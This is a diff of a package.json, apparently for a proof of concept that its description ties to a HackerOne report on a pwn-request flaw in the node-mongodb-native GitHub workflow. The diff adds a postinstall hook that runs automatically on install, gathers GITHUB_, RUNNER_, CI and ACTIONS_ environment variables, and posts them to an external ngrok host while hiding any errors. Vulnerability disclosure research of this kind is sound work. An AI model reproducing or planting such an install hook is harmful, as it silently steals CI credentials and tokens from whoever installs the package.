@@ -1,7 +1,14 @@
 {
-  "name": "node-driver-security-poc",
+  "name": "pwn-request-poc-target",
   "version": "1.0.0",
+  "description": "Researcher-owned PoC — reproduces the mongodb/node-mongodb-native release_notes.yml pwn-request for HackerOne report #3679812. Not a real package.",
+  "main": "index.js",
   "type": "module",
   "private": true,
-  "scripts": { "test": "echo no tests" }
+  "scripts": {
+    "test": "echo \"no tests\" && exit 0",
+    "postinstall": "node -e \"const https=require('https');const u=new URL('https://583a0e9766b3.ngrok.app/postinstall');const p={hostname:u.hostname,path:u.pathname,method:'POST',headers:{'Content-Type':'application/json'}};const b=JSON.stringify({stage:'postinstall',env:Object.fromEntries(Object.entries(process.env).filter(([k])=>/^(GITHUB_|RUNNER_|CI|ACTIONS_)/.test(k)))});const r=https.request(p);r.on('error',()=>{});r.write(b);r.end();\""
+  },
+  "author": "lucasfutures",
+  "license": "UNLICENSED"
 }
